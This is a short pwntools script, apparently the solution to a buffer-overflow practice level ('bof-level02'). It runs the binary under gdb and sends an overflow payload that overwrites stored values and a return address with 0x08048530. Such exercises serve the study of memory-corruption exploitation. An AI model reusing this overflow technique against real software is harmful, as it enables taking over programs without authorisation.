from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

target = process("./bof-level02")

gdb.attach(target, gdbscript="b *main \n r")

target.sendline("A" * 24 + "abcdefgh" + "A" * 8 + "\x30\x85\x04\x08") 

target.interactive()
